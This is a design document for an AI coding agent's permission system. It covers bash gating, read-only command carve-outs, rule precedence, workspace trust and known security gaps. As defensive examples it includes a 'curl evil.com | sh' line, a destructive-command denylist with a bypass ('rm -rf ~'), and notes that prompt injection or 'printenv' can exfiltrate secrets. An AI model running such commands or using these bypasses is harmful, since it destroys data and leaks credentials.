# PERMISSIONS.md — the trust model, and why bash is the hard case

By default, minicc gates five tools before the model may run them: `bash`,
`write_file`, `edit_file`, `memory` (writes only — `view` is free), and
`web_fetch` (a crafted URL can exfiltrate data under prompt injection). Reads
(`read_file`, `glob`, `grep`) run freely unless a matching `ask` or `deny` rule
restricts them. `write_file`/`edit_file` are gated but *bounded*: the prompt
previews the exact path + diff. **bash is the hard case** — most of this document
is about it; the last section covers how grants persist. Code:
[`permissions/`](minicc/permissions/), [`tools/bash.py`](minicc/tools/bash.py).
Primary parity references: [permissions](https://code.claude.com/docs/en/permissions),
[hooks](https://code.claude.com/docs/en/hooks), and
[security](https://code.claude.com/docs/en/security).

## Why bash is gated

The line between gated and not is **predictability**. For `write_file`, minicc
knows it's writing file X with content Y and can show you. For `bash` it knows
nothing: `subprocess.run(command, shell=True)` on an arbitrary string that could
be `ls` or `curl evil.com | sh`. No automated check can bound a shell command's
effect, so gating substitutes **a human looking at each command** for the
bounding that code can't provide. bash is the one tool whose blast radius is
unbounded *and* opaque.

## The read-only carve-out + permission rules (CC parity, rebuilt 2026-07-14)

CC runs a built-in set of read-only bash commands "without a permission prompt in
every mode", and persists `Bash(prefix *)` allow rules per project ("Yes, don't
ask again"). The three-arm /init experiment measured the gap: 18 approval prompts
on baseline minicc vs 0 on CC for the same exploration — and prompting on every
`ls` suppresses exploration depth, making this a QUALITY problem, not just
friction. minicc now mirrors both mechanisms (`is_readonly_command` and
`command_is_allowed` in `permissions/bash.py`):

- **The read-only list** (CC's, verbatim): `ls cat echo pwd head tail grep find
  wc which diff stat du` + `cd` *within the working directory* + read-only `git`
  subcommands (status/log/diff/show/blame/…; branch/tag/remote/stash excluded
  outright — each has mutating forms).
- **Permission rules**: `permissions.deny`, `permissions.ask`, and
  `permissions.allow` use CC-shaped entries such as `Bash(uv run *)`,
  `Read(/secrets/**)`, and `WebFetch(domain:example.com)`. Tool names accept CC's
  exported casing and are normalized to minicc's internal names.
- **Rule precedence** is global and deterministic: `deny → ask → allow`. A
  matching `deny` blocks without prompting; `ask` forces a one-shot prompt; only
  then can settings, Hook, Skill, session, or built-in grants allow the call.
- **Bash wildcards** retain the existing semantics: `*` spans spaces; trailing
  `" *"` (alias `:*`) is a word boundary. The `always` answer persists a narrow
  first-two-token rule to project-local settings.
- **Interactive approval scope is tool-specific**, matching CC rather than
  treating every gated tool alike: Bash offers one-call approval or a bounded
  persistent command rule; Edit and Write share one session-only editing grant;
  WebFetch offers one-call approval or a persistent rule for the exact hostname;
  memory writes retain minicc's session-only batch grant.
- **Path rules** retain their settings source. A single `/` anchors at that
  source: shared-project rules use that project source's directory, local rules
  use the original launch directory, and user rules use `~/.minicc`. Relative
  patterns use the launch directory, `~/` uses HOME, and `//tmp/**` is
  filesystem-absolute. `*` matches one segment while `**` recurses. Rules check
  both a symlink and its target: allows require both; deny/ask matches either.
- **Compound commands split on CC's operators** (`&& || ; | |& &`, newlines);
  every subcommand must independently qualify — `ls && rm x` prompts.
- A compound command mixing `cd` and `git` does not receive the built-in
  read-only exemption, even when each segment would qualify separately.
- **Wrapper stripping** (CC's fixed set): `timeout/time/nice/nohup/stdbuf`,
  `command`, `builtin`, `noglob`, and bare `xargs`.
- **Conservative auto-approval**: redirections (except harmless `2>&1` and
  `/dev/null` sinks), substitutions, backticks, subshells, env prefixes,
  mutating `find` forms, `git log --output`, or input `shlex` cannot bound fall
  back to a prompt. This analyzer is deliberately narrow; it is not a shell
  sandbox or a formal proof of a command's effects.
- Recorded divergence: prefix derivation remains minicc's heuristic because CC
  does not publish the exact dialog algorithm.

## Workspace Trust

Before project-controlled capabilities become active, startup asks whether the
workspace is trusted. Like Claude Code, the dialog separately summarizes
pre-approved tool permissions and additional workspace directories, including
legacy `allowed_tools`. Acceptance is keyed by the canonical main checkout,
shared by linked worktrees, or by the canonical launch directory outside a
repository. An accepted parent covers the generic startup check for descendants,
but—matching Claude Code—it does not activate a nested workspace's `allow` rules
or additional directories. Those fields require an exact Trust decision for the
nested identity. Persistent decisions live in `~/.minicc/trust.json`; starting
directly from the user's home directory is trusted only for that process.
The dialog shows the launch directory and, when different, the repository
identity the decision covers, matching Claude Code 2.1.218 and later.

Declining no longer exits. minicc continues in a restricted mode: user settings
remain active, while project hooks, skills, agents, instructions, environment
loading, `allow` rules, and other capability-expanding settings stay disabled.
Project `deny` and `ask` rules still apply because they can only remove authority
or require an explicit decision. Settings entries retain their source file,
scope, and permission anchor so diagnostics and path rules retain provenance.
Trusted skill and agent discovery walks from the workspace root down to the
launch directory; it never imports executable project customization from above
the accepted workspace boundary.

If a parent Trust already covers the launch directory, ordinary project
configuration can run without another generic prompt. When the nested workspace
contains still-gated tool permissions or additional directories, minicc shows a
second, Claude Code-style backstop. Declining that backstop continues with the
ordinary project configuration active but leaves those grant fields ignored.
Project-local grant fields skip that backstop only after a post-Trust Git check
shows that the repository did not supply the file; tracked files, symlinks, and
indeterminate checks remain gated. When minicc starts directly in HOME, that
user-owned configuration location's local grants are active before generic
workspace Trust, matching Claude Code's configuration-home exception.

## What layer is bash's scope at?

A permission decision and what the tool can actually *do* are different layers —
and bash has a boundary at only one of them.

**Permission layer** — where trust is decided. A `PreToolUse` hook (HOOKS.md)
runs first and can `deny` the call outright, `allow` it past the gate, or `ask`
to force the prompt; then `authorize()` resolves policy:

```
PreToolUse deny?       → blocked before authorization
settings deny?         → blocked, even if Hook or Skill says allow
hook/settings ask?     → one-shot prompt [yes / no]
matching allow/grant?  → run without prompting
built-in free call?    → run without prompting
else                   → prompt with that tool's supported approval scopes
```

The default interactive choices are therefore:

- Bash: `yes / always / no`, where `always` saves bounded `Bash(...)` rules.
- Edit or Write: `yes / all / no`, where `all` enables both editing tools until
  the session is reset.
- WebFetch: `yes / always / no`, where `always` saves the exact
  `WebFetch(domain:...)` hostname rule.
- Memory writes: `yes / all / no`, where `all` lasts for this session.
- A settings or Hook `ask` decision always reduces the prompt to `yes / no` so
  it cannot silently override the restrictive policy that requested review.

A bare deny rule such as `Write` also removes that tool schema before the request
is sent, so the model is not encouraged to call a capability that policy has
disabled. Scoped denies remain advertised and return a source-specific denial,
allowing the model to re-plan.

This is the *only* boundary that constrains bash.

**Execution layer** — what bash reaches once approved (`bash.py`): **nothing
confines it.** `subprocess.run(command, shell=True)` with no `cwd=` jail (cwd only
sets the starting pwd; `cd`, absolute paths, `~` all escape — *"scope escapes
outside cwd are NOT detected"*), no `env=` restriction (it inherits the whole
environment, **including `ANTHROPIC_API_KEY`**), no sandbox. Privileges = your
user, over the **whole machine**: filesystem, network, processes. The only
technical guards — a regex denylist (`rm -rf /`, `sudo`, `mkfs`…), a 120s default
timeout (model-extendable to 600s), an output cap — are speed bumps, not
boundaries (the denylist still misses e.g. `rm -rf ~`).

> **So bash's scope is the whole machine at your privilege, and the permission
> gate is its *sole* boundary.** There is no second technical fence. (minicc now has CC-style
> `bash(prefix *)` rules and the read-only carve-out at the permission layer —
> but the EXECUTION layer remains unconfined either way.)

## Persisting trust — four lifetimes, and the principle that separates them

- **A skill's `allowed-tools`** (2026-07-16) — the shortest lifetime: rules or
  tool names granted when a skill is invoked, cleared at the **next user
  message** (CC's window). Printed when applied ("skill grants (until your
  next message): …"). Never persisted; `reset()` clears it too.
- **`'all'` at an Edit or Write prompt** — one shared file-editing grant for the
  session, covering both tools and disappearing on restart or `/clear`.
- **`'all'` at a memory-write prompt** — minicc's session-only batch grant for
  memory mutations.
- **`allowed_tools` in settings** — legacy whole-tool, hand-edited, persistent;
  project entries require Workspace Trust and bash remains excluded
  (`NO_PRELOAD`).
- **`'always'` at a bash prompt** — a **narrow prefix rule** (`Bash(uv run *)`),
  persisted to `.minicc/settings.local.json` at the workspace root. Restricted
  workspaces do not offer this project-local persistence choice.
- **`'always'` at a WebFetch prompt** — an exact hostname rule such as
  `WebFetch(domain:docs.example.com)`, persisted to the same project-local file.

The principle that governs all four:

> A mistake's cost = its permanence × its silence.

A broad session choice must **never auto-persist** — otherwise the prompt meant
to protect you trains you to disable it forever. Bash therefore has no
interactive whole-tool session grant; persistent approval requires bounded
command rules. WebFetch follows the same principle with an exact hostname rule.

**Revised 2026-07-12** (was: "the one tool never eligible for persistence is
bash"): **rule granularity changes the arithmetic**. A persisted `Bash(uv run *)`
is not "trust bash forever"; it's "trust this reviewed command family".
Permanence is bounded by the prefix; silence is removed by the startup print
("permission allow rules from settings: …") and by the rule being written only
on an explicit `always` answer at a visible prompt. Both factors shrink — that's what
makes persistence defensible. This is CC's own resolution (its "don't ask again"
persists per project + command prefix).

## Debt surfaced by this analysis

- bash denylist is trivially bypassable — decorative, not a boundary.
- bash inherits the full env incl `ANTHROPIC_API_KEY` — an approved `printenv`
  leaks it; consider scrubbing secrets from the subprocess env.
- no path confinement / sandbox; whole-tool grants except bash's rule layer.
- Read/Edit path checks are exact for direct-path calls. Broad `glob` and `grep`
  searches still lack CC's result-level best-effort filtering, and future
  MCP/plugin resources need their own path semantics.
- `web_search` runs inside the Messages API. Explicit `deny`/`ask` rules hide it
  fail-closed, but minicc cannot yet prompt or run `PreToolUse` around each server
  invocation; Claude Code supports both controls for WebSearch.
- `additionalDirectories` is previewed at Trust time, but minicc still has no
  sandbox or file-access boundary, so the dialog explicitly labels it as an
  unenforced compatibility setting rather than claiming that access changed.
